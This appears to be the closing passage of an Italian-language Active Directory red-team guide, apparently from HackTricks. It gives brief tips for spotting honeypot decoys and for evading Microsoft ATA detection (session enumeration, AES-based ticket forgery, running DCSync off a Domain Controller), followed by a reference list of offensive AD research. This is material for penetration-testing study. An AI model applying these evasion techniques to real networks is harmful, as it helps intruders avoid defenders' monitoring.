- **Indicatori generali**: il confronto degli attributi dei potenziali oggetti esca con quelli degli oggetti autentici può rivelare incongruenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare questo tipo di deception.

### **Elusione dei sistemi di detection**

- **Elusione della detection di Microsoft ATA**:
- **Enumerazione degli utenti**: evitare l'enumerazione delle sessioni sui Domain Controller per prevenire la detection da parte di ATA.
- **Impersonation dei ticket**: l'utilizzo di chiavi **aes** per la creazione dei ticket aiuta a eludere la detection, evitando il downgrade a NTLM.
- **Attacchi DCSync**: si consiglia di eseguirli da un host diverso da un Domain Controller per evitare la detection di ATA, poiché l'esecuzione diretta da un Domain Controller attiverà gli alert.

## References

- [1] [Una guida all'attacco dei trust di dominio](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Falsificazione dei trust per la deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Da Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Raccolta LDAP BOF – Toolkit LDAP in memoria per lo sfruttamento di Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing degli hash NTLM come wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (NetExec AD Lab) – Pirati](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analisi di Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: presa di controllo degli account Active Directory tramite Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Come gestire le modifiche alle connessioni del secure channel Netlogon associate a CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un viaggio nelle interfacce Null Session e MS-RPC dimenticate](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Il SID filter come confine di sicurezza tra domini? (Parte 4) - Ricerca sull'elusione del SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Il SID filter come confine di sicurezza tra domini? (Parte 5) - Golden GMSA trust attack - dal child al parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Il SID filter come confine di sicurezza tra domini? (Parte 6) - Schema change trust attack - dal child al parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Da DA a EA con ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Da admin del child domain a enterprise admin in 5 minuti abusando di AD CS, seguito](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE nella manica: progettare backdoor DACL per Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
